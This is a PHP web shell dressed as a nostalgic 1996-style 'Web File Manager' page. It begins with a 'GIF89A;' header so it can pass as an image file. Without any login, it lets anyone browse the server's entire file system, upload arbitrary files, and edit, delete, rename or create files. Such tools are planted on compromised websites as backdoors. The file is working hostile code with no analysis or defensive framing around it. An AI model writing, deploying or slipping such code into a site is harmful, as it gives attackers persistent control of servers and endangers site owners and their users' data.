GIF89A;
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WEB FILE MANAGER v1.0 - 1996</title>
    <style>
        body {
            background-color: #c0c0c0;
            font-family: "Times New Roman", Times, serif;
            color: #000;
            margin: 20px;
        }
        h2, h3 {
            background-color: #000080;
            color: #ffffff;
            padding: 5px;
            font-size: 18px;
            border: 2px outset #ffffff;
            margin-top: 0;
        }
        a { color: #0000ee; text-decoration: underline; }
        a:visited { color: #551a8b; }
        table {
            border-collapse: collapse;
            width: 100%;
            background-color: #ffffff;
            border: 2px inset #ffffff;
            margin-bottom: 15px;
        }
        th {
            background-color: #d3d3d3;
            border: 1px solid #808080;
            padding: 4px;
            text-align: left;
        }
        td {
            border: 1px solid #808080;
            padding: 4px;
        }
        input[type="submit"], button {
            background-color: #c0c0c0;
            border: 2px outset #ffffff;
            font-weight: bold;
            padding: 2px 10px;
        }
        input[type="submit"]:active {
            border: 2px inset #ffffff;
        }
        input[type="text"], textarea {
            background-color: #ffffff;
            border: 2px inset #808080;
        }
        .perm-indicator {
            border: 1px solid #000;
            display: inline-block;
            width: 12px;
            height: 12px;
            margin-right: 5px;
        }
        .win-panel {
            border: 2px outset #ffffff;
            padding: 10px;
            background-color: #d3d3d3;
        }
    </style>
</head>
<body>

<?php
session_start();
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;

function list_directory($dir) {
    $files = array_diff(scandir($dir), array('.', '..'));
    echo '<table>';
    echo '<tr><th width="50">Status</th><th>Name</th><th width="250">Actions</th></tr>';
    foreach ($files as $file) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $file);
        $color = '#ffffff';
        if (is_readable($path) && is_writable($path)) { $color = '#00ff00'; }
        elseif (!is_writable($path)) { $color = '#ff0000'; }

        echo '<tr>';
        echo '<td align="center"><div class="perm-indicator" style="background-color:'.$color.'"></div></td>';
        if (is_dir($path)) {
            echo '<td><b>[DIR] <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($file) . '</a></b></td>';
        } else {
            echo '<td>' . htmlspecialchars($file) . '</td>';
        }
        echo '<td>';
        if (!is_dir($path)) {
            echo '<a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">[EDIT]</a> ';
            echo '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">[DELETE]</a> ';
            echo '<a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">[RENAME]</a>';
        }
        echo '</td></tr>';
    }
    echo '</table>';
}

function upload_file($dir) { if (isset($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], $dir . DIRECTORY_SEPARATOR . basename($_FILES['f']['name'])); } }
function create_dir($dir) { if (isset($_POST['dn'])) { $nd = $dir . DIRECTORY_SEPARATOR . basename($_POST['dn']); if (!file_exists($nd)) mkdir($nd, 0777, true); } }
function create_file($dir) { if (isset($_POST['fn'])) { $nf = $dir . DIRECTORY_SEPARATOR . basename($_POST['fn']); if (!file_exists($nf)) file_put_contents($nf, ''); } }
function delete_file($p) { if (is_file($p)) unlink($p); }
function rename_file($p) { if (isset($_POST['nn'])) { rename($p, dirname($p) . DIRECTORY_SEPARATOR . $_POST['nn']); } }

function edit_file($p) {
    if (isset($_POST['c'])) { file_put_contents($p, $_POST['c']); }
    $c = file_get_contents($p);
    echo '<form method="POST"><textarea name="c" style="width:100%;height:350px;font-family:monospace;background:#fff;color:#000;">' . htmlspecialchars($c) . '</textarea><br><br><input type="submit" value="SAVE CHANGES"></form>';
}

if (isset($_GET['delete'])) delete_file($current_dir . DIRECTORY_SEPARATOR . $_GET['delete']);
if (isset($_GET['rename'])) rename_file($current_dir . DIRECTORY_SEPARATOR . $_GET['rename']);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    upload_file($current_dir);
    create_dir($current_dir);
    create_file($current_dir);
}

echo '<div class="win-panel">';
echo '<h2>LOCATION: ' . htmlspecialchars($current_dir) . '</h2>';
$parent = dirname($current_dir);
echo '<p><a href="?dir=' . urlencode($parent) . '"> [ UP ONE LEVEL ] </a></p>';

if (isset($_GET['edit'])) {
    edit_file($current_dir . DIRECTORY_SEPARATOR . $_GET['edit']);
    echo '<p><a href="?dir=' . urlencode($current_dir) . '"><- Back to Explorer</a></p>';
} else {
    list_directory($current_dir);
    echo '<hr noshade>';
    echo '<table style="background:none; border:none; width:auto;"><tr>';
    echo '<td valign="top" style="border:none; padding-right:30px;">';
    echo '<h3>Upload</h3><form method="POST" enctype="multipart/form-data"><input type="file" name="f"><br><br><input type="submit" value="UPLOAD"></form></td>';
    echo '<td valign="top" style="border:none; padding-right:30px;">';
    echo '<h3>New Folder</h3><form method="POST"><input type="text" name="dn"><br><br><input type="submit" value="CREATE"></form></td>';
    echo '<td valign="top" style="border:none;">';
    echo '<h3>New File</h3><form method="POST"><input type="text" name="fn"><br><br><input type="submit" value="CREATE"></form></td>';
    echo '</tr></table>';

    if (isset($_GET['rename'])) {
        echo '<hr noshade><h3>Rename: ' . htmlspecialchars($_GET['rename']) . '</h3>';
        echo '<form method="POST" action="?dir=' . urlencode($current_dir) . '&rename=' . urlencode($_GET['rename']) . '">';
        echo '<input type="text" name="nn" value="' . htmlspecialchars($_GET['rename']) . '"> <input type="submit" value="RENAME NOW"></form>';
    }
}
echo '</div>';
echo '<center><p><font size="2" face="Arial">Optimized for Internet Explorer 3.0 & Netscape Navigator</font></p></center>';
?>
</body>
</html>